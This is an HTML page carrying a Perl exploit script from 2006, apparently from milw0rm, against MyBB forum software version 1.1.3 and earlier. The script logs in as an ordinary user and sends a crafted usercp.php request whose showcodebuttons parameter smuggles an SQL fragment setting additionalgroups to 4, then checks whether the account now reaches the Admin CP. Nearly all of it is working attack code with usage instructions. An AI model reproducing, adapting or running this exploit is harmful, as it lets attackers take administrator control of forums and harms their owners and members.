<html><head><title>MyBulletinBoard (MyBB) <= 1.1.3 (usercp.php) Create Admin Exploit</title></head><pre>#!/usr/bin/perl
# MyBulletinBoard (MyBB) &lt;= 1.1.3 Create An Admin Exploit
#
# www.h4ckerz.com / hackerz.ir / aria-security.net / Myimei.com /
# ./2006-6-23
### Coded By Hessam-x / Hessamx-at-Hessamx.net

use IO::Socket; 
use LWP::UserAgent;
use HTTP::Cookies;


 $host = $ARGV[0];
 $uname = $ARGV[1];
 $passwd = $ARGV[2];
 $url = &quot;http://&quot;.$host;
 
 print q(
 ###########################################################
 # MyBulletinBoard (MyBB) &lt;= 1.1.3 Create An Admin Exploit #
 #           www.hackerz.ir - www.h4ckerz.com              #
 ################### Coded By Hessam-x #####################

);


 
 if (@ARGV &lt; 3) {
 print &quot; #  usage : hx.pl [host&amp;path] [uname] [pass]\n&quot;; 
 print &quot; #  E.g : hx.pl www.milw0rm.com/mybb/ str0ke 123456\n&quot;; 
  exit();
 }
 
    print &quot; [~] User/Password : $uname/$passwd \n&quot;;
    print &quot; [~] Host : $host \n&quot;;
    print &quot; [~] Login ... &quot;;


   
$xpl = LWP::UserAgent-&gt;new() or die;
$cookie_jar = HTTP::Cookies-&gt;new();

$xpl-&gt;cookie_jar( $cookie_jar );
 $res = $xpl-&gt;post($url.'member.php',
 Content =&gt; [
 &quot;action&quot;   =&gt; &quot;do_login&quot;,
 &quot;username&quot;   =&gt; &quot;$uname&quot;,
 &quot;password&quot;   =&gt; &quot;$passwd&quot;,
 &quot;submit&quot;      =&gt; &quot;Login&quot;,
 ],);
 
 if($cookie_jar-&gt;as_string =~ /mybbuser=(.*?);/) { 
  print &quot;successfully .\n&quot;;
  } else { 
  print &quot;UNsuccessfully !\n&quot;;
  print &quot; [-] Can not Login In $host !\n&quot;; 
  exit(); 
  }
 
$req = $xpl-&gt;get($url.'usercp.php?action=do_options&amp;showcodebuttons=1\',additionalgroups=\'4');
$tst = $xpl-&gt;get($url.'index.php');
if ($tst-&gt;as_string =~ /Admin CP/) { 
print &quot; [+] You Are Admin Now !!&quot;;
} else {
    print &quot; [-] Exploit Failed !&quot;;
    }

# milw0rm.com [2006-06-25]</pre></html>